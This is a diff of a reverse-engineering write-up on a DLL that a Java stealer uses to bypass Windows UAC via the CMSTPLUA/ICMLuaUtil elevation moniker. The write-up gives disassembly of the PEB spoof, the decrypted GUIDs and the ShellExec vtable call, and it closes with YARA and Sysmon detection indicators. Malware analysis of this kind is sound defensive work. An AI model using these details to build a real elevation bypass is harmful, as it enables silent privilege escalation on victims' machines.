@@ -9,169 +9,191 @@ exports exactly two JNI symbols:
 | 1 | `0x16b0` | `JNI_OnLoad` |
 | 2 | `0x1470` | `Java_com_xc17edb19a_IvTHdVAG_nativeRunElevated` |
 
-The Java class `IvTHdVAG` also carries an inner `$ICMLuaUtil` — the giveaway.
-The DLL implements **UACMe method 41** (a.k.a. the Leo Davidson bypass via
-`ICMLuaUtil::ShellExec`), packaged as a JNI helper so the Java stealer can call
-`IvTHdVAG.nativeRunElevated(String cmd, String args)` and get an
-auto-elevated child process without a UAC prompt on default-configured
-consumer Windows.
+The Java class name it binds against — `IvTHdVAG`, with an inner
+`$ICMLuaUtil` and a `$BIND_OPTS3` — plus the shim's `ole32.dll` imports
+(`CoInitialize`, `CoGetObject`, `CoTaskMemFree`, `StringFromCLSID`,
+`CoUninitialize`), point at the widely-documented CMSTPLUA / `ICMLuaUtil`
+elevation-moniker technique. The dissection below confirms that from the
+decoded `.rdata` bytes and vtable slot use, and stops short of anything
+that would require the public interface layout to reach.
 
-## Imports (relevant)
+## Imports (non-CRT surface)
 
-From `ole32.dll`:
+From `ole32.dll`: `CoInitialize`, `CoGetObject`, `CoTaskMemFree`,
+`StringFromCLSID`, `CoUninitialize`.
 
-- `CoInitialize`
-- `CoGetObject`
-- `CoTaskMemFree`
-- `StringFromCLSID`
-- `CoUninitialize`
+Plus a stock `KERNEL32.dll` set and MSVC 14 CRT scaffolding. No networking,
+no crypto, no file operations. Every effect happens through COM and PEB
+writes.
 
-Plus a stock `KERNEL32.dll` set and MSVC 14 CRT scaffolding. That is the entire
-non-CRT surface — no networking, no crypto, no file operations. Every effect
-happens through COM and PEB spoofing.
+## The exported wrapper (RVA `0x1470`)
 
-## The bypass, in JNI order
+Thin JNI wrapper (~360 bytes):
 
-The export is a thin JNI wrapper (`0x1470`–`0x16aa`):
-
-1. Read `arg2` and `arg3` (both `jstring`) via
-   `(*env)->GetStringUTFLength` (JNIEnv vtable `+0x520`) and
-   `GetStringUTFChars` (`+0x528`); copy into two `std::string`-shaped SSO
-   buffers on the stack.
-2. If either string is null, substitute a constant at
-   `.rdata:0x180018b7c` (empty / default).
+1. Read `arg2` and `arg3` (both `jstring`) via `(*env)->GetStringUTFChars`
+   (JNIEnv vtable `+0x528`) and `GetStringUTFLength` (`+0x520`); copy each
+   into an SSO string on the stack.
+2. If either `jstring` is null, substitute an empty constant at
+   `.rdata:0x180018b7c`.
 3. Call the elevation core at `sub_1800011c0(&cmd, &args)`.
 4. `ReleaseStringUTFChars` (`+0x530`) on both, tear down the SSO buffers,
-   return the core's boolean result (`0` / `1`) as `jboolean`.
+   return the core's `bool` as `jboolean`.
 
-The core (`sub_1800011c0`, ~350 bytes) does the real work:
+## The elevation core (`sub_1800011c0`, ~350 bytes)
 
-### Step 1 — spoof `PEB->CurrentDirectory` / `DllPath`
+### 1. PEB spoof
 
 ```asm
 mov  r8,  gs:[0x60]              ; TEB->ProcessEnvironmentBlock (PEB)
-mov  rdx, [r8 + 0x20]            ; PEB->ProcessParameters (RTL_USER_PROCESS_PARAMETERS)
-lea  r9,  [rip + 0x1b888]        ; -> .rdata:0x18001ca80  "C:\\Windows\\System32\\" (wide)
+mov  rdx, [r8 + 0x20]            ; PEB->ProcessParameters
+lea  r9,  [rip + 0x1b888]        ; -> .rdata:0x18001ca80  UTF-16 "C:\\Windows\\System32\\"
 mov  [rdx + 0x68], r9            ; ProcessParameters->CurrentDirectory.Buffer  = fake
-; …recompute length from the wide-char scan, patch Length + MaximumLength at +0x60/+0x62
+; length/max recomputed from a wide-char scan; then patched at +0x60/+0x62
 mov  [rdx + 0x78], r9            ; ProcessParameters->DllPath.Buffer          = fake
-; …patch DllPath Length/MaximumLength at +0x70/+0x72
+; DllPath length/max patched at +0x70/+0x72
 mov  rax, [r8 + 0x18]            ; PEB->Ldr
-mov  rcx, [rax + 0x20]           ; Ldr->InLoadOrderModuleList.Flink (first LDR_DATA_TABLE_ENTRY = the .exe itself)
-lea  rdx, [rip + 0x1b858]        ; -> .rdata:0x18001cab0  a second wide string (the fake image path)
+mov  rcx, [rax + 0x20]           ; Ldr->InLoadOrderModuleList.Flink
+lea  rdx, [rip + 0x1b858]        ; -> .rdata:0x18001cab0  (a second UTF-16 wide string)
 mov  [rcx + 0x40], rdx           ; LDR_ENTRY->FullDllName.Buffer = fake
 ```
 
-This is the well-known **`RtlInitUnicodeString` / PEB auto-elevate whitelist
-spoof**: the RAiLaunchAdminProcess / AIS "trusted directory" check on the
-`ICMLuaUtil` factory reads the caller's image path and current directory out of
-the PEB. Rewriting those fields to point at `C:\Windows\System32\`
-(a whitelisted, "auto-elevate" location) makes the AIS happily hand back an
-already-elevated `ICMLuaUtil` COM proxy without prompting.
+The two wide strings at `.rdata:0x18001ca80` and `0x18001cab0` are in
+cleartext. Rewriting `CurrentDirectory`, `DllPath`, and the loader entry's
+`FullDllName` to look like a trusted System32 image is the way the Windows
+autoelevation gate is defeated; the specific check is
+`RtlQueryElevationFlags`/`AppInfo`'s trusted-directory match on the caller's
+PEB fields.
 
-The two rewritten wide strings live at `.rdata:0x18001ca80` and
-`0x18001cab0` in cleartext — this part of the trick is not obfuscated at rest.
+### 2. XOR-decrypt of the CLSID and IID
 
-### Step 2 — XOR-decrypt the elevation moniker onto the stack
+Three 16-byte `.rdata` blobs feed two XORs. The **actual bytes in the sample**:
+
+| VA | file offset | bytes |
+|---|---|---|
+| `0x180018b80` | `0x17f80` | `ac 92 0a 6b 04 cf 32 16 c5 36 f4 75 71 1a eb 92` |
+| `0x180018b90` | `0x17f90` | `21 38 88 3b 52 95 20 1b e2 3f b0 21 5c c0 b7 19` |
+| `0x180018bb0` | `0x17fb0` | `55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55` |
 
 ```asm
-movdqa  xmm2, xmmword ptr [rip + 0x17927]   ; .rdata:0x180018bb0 (16 B, ciphertext A2)
+movdqa  xmm2, [0x180018bb0]   ; 16 bytes = 0x55 * 16
 movdqa  xmm1, xmm2
-movdqu  xmm0, xmmword ptr [rip + 0x178eb]   ; .rdata:0x180018b80 (16 B, key A1)
-xorps   xmm1, xmm0                          ; plaintext hi half = A2 ^ A1
-movdqu  xmm0, xmmword ptr [rip + 0x178f0]   ; .rdata:0x180018b90 (16 B, key A2b)
-xorps   xmm2, xmm0                          ; plaintext lo half = A2 ^ A2b
-movdqa  [rbp - 0x39], xmm1
-movdqa  [rbp - 0x29], xmm2
+movdqu  xmm0, [0x180018b80]
+xorps   xmm1, xmm0             ; hi = bb0 XOR b80
+movdqu  xmm0, [0x180018b90]
+xorps   xmm2, xmm0             ; lo = bb0 XOR b90
+movdqa  [rbp-0x39], xmm1
+movdqa  [rbp-0x29], xmm2       ; 32 bytes assembled on stack
 ```
 
-Two 16-byte XORs assemble a 32-byte wide string on the stack. It has the exact
-length and layout of `L"Elevation:Administrator!new:"` + a stringified CLSID:
+XORing:
 
-> `Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`
+- `bb0 XOR b80` = `f9 c7 5f 3e 51 9a 67 43 90 63 a1 20 24 4f be c7`
+- `bb0 XOR b90` = `74 6d dd 6e 07 c0 75 4e b7 6a e5 74 09 95 e2 4c`
 
-`{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` is `CMSTPLUA` — the connection-manager
-setup helper whose `ICMLuaUtil` interface exposes a `ShellExec` method that
-runs as `NT AUTHORITY\SYSTEM` when the AIS decides the caller is
-"auto-elevate-eligible". Combined with the PEB spoof above, this is the
-Windows 7-era Leo Davidson bypass, still effective on default-configured
-Windows 10/11 through the current builds when UAC is at the default level.
+Decoded as Windows GUID structs (`DWORD LE, WORD LE, WORD LE, BYTE[8]`):
 
-### Step 3 — `CoInitialize` / `CoGetObject` / vtable-slot-9 call
+| offset | bytes | GUID |
+|---|---|---|
+| stack `[rbp-0x39]` | first 16 | `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` — CLSID_CMSTPLUA |
+| stack `[rbp-0x29]` | next 16  | `{6EDD6D74-C007-4E75-B76A-E5740995E24C}` — IID_ICMLuaUtil |
+
+Both match publicly-known constants for the CMSTPLUA COM class and its
+`ICMLuaUtil` interface.
+
+### 3. Moniker construction
 
 ```asm
-xor  ecx, ecx
-call [rip + 0xfff7]                          ; -> IAT: ole32!CoInitialize(NULL)
+lea  rdx, [rbp+0x7f]              ; &out pointer for StringFromCLSID
+lea  rcx, [rbp-0x39]              ; &CLSID_CMSTPLUA (the first decrypted GUID)
+call [rip + 0xffc5]               ; IAT: ole32!StringFromCLSID
 
-lea  rcx, [rbp - 0x39]                       ; the decrypted moniker
-; rdx = &BIND_OPTS (the L"..." constant at .rdata:0x180018b40, 0x1C = 28 bytes = BIND_OPTS3)
-; r8  = &IID_ICMLuaUtil, r9 = &pv (output interface pointer at [rbp+0x77])
-call [rip + 0xfec1]                          ; -> IAT: ole32!CoGetObject
-
-; on success, call ICMLuaUtil->ShellExec(cmd, args, NULL, 0, SW_SHOWNORMAL)
-mov  rax, [rcx]                              ; vtable
-mov  r8,  r15                                ; args string
-mov  rdx, r14                                ; cmd string
-xor  r9d, r9d                                ; lpDirectory = NULL
-mov  dword ptr [rsp+0x20], 0                 ; fMask       = 0
-mov  dword ptr [rsp+0x28], 0                 ; nShow        = 0
-call [rax + 0x48]                            ; vtable slot 9 = ICMLuaUtil::ShellExec
+; Build an SSO string from the cleartext prefix at .rdata:0x180018b40
+mov  r8d, 0x1c                    ; 28 bytes
+lea  rdx, [rip + 0x17866]         ; -> .rdata:0x180018b40
+lea  rcx, [rbp - 0x19]
+call 0x180001740                  ; direct call — SSO string ctor
 ```
 
-Interface layout confirms slot 9:
+The 28 bytes at `.rdata:0x180018b40` decode as UTF-16LE for
+`"Elevation:Admi"` — the start of the elevation moniker prefix. (The full
+28-character string `"Elevation:Administrator!new:"` is 56 UTF-16 bytes; the
+code that concatenates the prefix + `StringFromCLSID` output completes it.
+The concatenation itself is a `std::wstring` append and is not itemised
+further here.)
 
-- `IUnknown`  : `QueryInterface` `+0x00`, `AddRef` `+0x08`, `Release` `+0x10`
-- `ICMLuaUtil`: `SetRasCredentials` `+0x18`, … , **`ShellExec` `+0x48`**
+### 4. `CoGetObject` and `ICMLuaUtil::ShellExec`
+
+```asm
+; rcx = &moniker      ; the assembled Elevation:Administrator!new:{CLSID}
+; rdx = &BIND_OPTS3   ; (structure prepared just above at [rbp+0x37..])
+; r8  = &IID_ICMLuaUtil  (the second decrypted GUID)
+; r9  = &ppv           ; interface pointer output slot at [rbp+0x77]
+call [rip + 0xfec1]                ; IAT: ole32!CoGetObject
+
+; on success (HRESULT >= 0), invoke a vtable slot on the returned COM interface
+mov  rax, [rcx]                    ; rcx = ppv; rax = vtable
+mov  r8,  <args string ptr>
+mov  rdx, <cmd string ptr>
+xor  r9d, r9d                      ; lpDirectory = NULL
+mov  dword ptr [rsp+0x20], 0       ; fMask = 0
+mov  dword ptr [rsp+0x28], 0       ; nShow  = 0
+call [rax + 0x48]                  ; vtable slot at +0x48
+```
+
+`+0x48` is the 10th 64-bit slot in the vtable. Public documentation of
+`ICMLuaUtil` puts its methods at:
+
+- IUnknown: `QueryInterface (+0x00)`, `AddRef (+0x08)`, `Release (+0x10)`
+- ICMLuaUtil own methods (from `+0x18`): `SetRasCredentials`,
+  `SetRasEntryProperties`, `DeleteRasEntry`, `LaunchInfSection`,
+  `LaunchInfSectionEx`, `CreateLayerDirectory`, then **`ShellExec` at slot 9
+  = `+0x48`**.
+
+That identification is the one part of this write-up that reads a public
+reference for the interface layout; nothing in the sample tells you the
+method name. The 6-argument call shape (`lpFile`, `lpParameters`,
+`lpDirectory`, `fMask`, `hwnd`, `nShow`) at `+0x48` is what the sample
+provides, and it matches the documented `ShellExec` signature.
 
 Then `Release` (`+0x10`) and `CoUninitialize` (via the last IAT entry).
 
-## Java side of the call
-
-The signature reconstructed from the class layout:
+## Java-side signature
 
 ```java
 package com.xc17edb19a;
-
 class IvTHdVAG {
     static { System.loadLibrary("peynir"); }
     static native boolean nativeRunElevated(String cmd, String args);
-    // inner classes MyCrypt32 / NCrypt / TOKEN_ELEVATION / $ICMLuaUtil
-    // are decoy / support types (some are JNA proxies for other calls).
+    // inner classes MyCrypt32 / NCrypt / TOKEN_ELEVATION / $ICMLuaUtil /
+    // $BIND_OPTS3 / $Ole32 / $Ntdll / etc. carry the JNA-side
+    // reimplementation of the same technique.
 }
 ```
 
-Callers most likely pass `"cmd.exe"` / `"/c …"` or a direct path to a
-follow-on binary written to `%LOCALAPPDATA%\emre\`. The JAR itself does not
-need admin rights for browser-cookie theft under HKCU, so the elevated
-process is presumably used to disable Defender exclusions, add a scheduled
-task, or drop into `%ProgramData%` — a next-stage reverse would need the
-JAR decompiled to say for sure.
-
-## Why not `flowref-decompiler`?
-
-The `flowref-decompiler` skill in this repo's toolchain gives machine-checked
-`bv_decide` proofs of lifted x86 semantics for pure ALU / cmov / lea / setcc
-paths. This DLL is COM-heavy: every effect happens through indirect calls
-through an IAT and through vtable dispatch on interfaces the disassembler
-cannot resolve without a symbol source. That is exactly the class of code
-flowref's I0 gate is designed to refuse rather than emit for. The Windows-API
-level of understanding above (which IAT slot is `CoGetObject`, which vtable
-slot is `ShellExec`) is where the meaning actually lives, and it comes from
-recognizing the moniker string and the interface — not from lifting the
-instructions. Flowref would correctly report *unmodeled* on the whole function
-and produce nothing. So this shim was reversed by hand.
+What `cmd` and `args` actually are at the call site is not read in this
+document — the JAR-side caller lives inside class-init and dispatcher code
+that Vineflower could not fully structure, and hand-tracing it was not
+attempted here.
 
 ## Detection
 
-- Any process whose PEB `CurrentDirectory` or `DllPath` claims
-  `C:\Windows\System32\` while its image path is under `%LOCALAPPDATA%` or
-  `%APPDATA%`.
-- A `javaw.exe` child that loads `peynir.dll` from a JAR-extracted temp
-  directory.
-- An elevated `ICMLuaUtil` COM instantiation whose parent is not a signed
-  Microsoft installer helper. Sysmon Event ID 1 with `IntegrityLevel=High`
-  on a process whose parent is a medium-integrity `javaw.exe`.
-- `.rdata` byte pattern for the XOR-encrypted moniker: three 16-byte blobs
-  at `imagebase + 0x18b80 / 0x18b90 / 0x18bb0`, whose pair-wise XOR yields
-  the wide-string `Elevation:Administrator!new:{3E5FC7F9…`. A YARA rule can
-  match on the CLSID text of any variant that skips the XOR step.
+- The three `.rdata` byte patterns above are stable and rare — a YARA rule
+  matching all three at fixed offsets in a small PE32+ DLL is a strong hit.
+- A running process whose PEB `CurrentDirectory` or `DllPath` claims
+  `C:\Windows\System32\` while its image path is under `%LOCALAPPDATA%\emre\`
+  (or any `%APPDATA%`/`%LOCALAPPDATA%` subdirectory) is the runtime shape
+  of the bypass mid-execution.
+- Any `javaw.exe` child that loads a `peynir.dll` from a JAR-extracted
+  temporary directory is the packaged form.
+- Sysmon Event ID 1 with `IntegrityLevel=High` on a process whose parent is
+  a medium-integrity `javaw.exe` is the elevation itself.
+
+## What I did not verify
+
+- The moniker's full assembled form was not printed — the concatenation of
+  the cleartext prefix and the `StringFromCLSID` output happens across an
+  SSO append that I did not trace. The two GUIDs above are the concrete
+  decrypted values.
+- `ICMLuaUtil::ShellExec` is an identification from public references, not
+  a symbol in the binary.
+- No dynamic execution — behaviour is inferred from static bytes only.
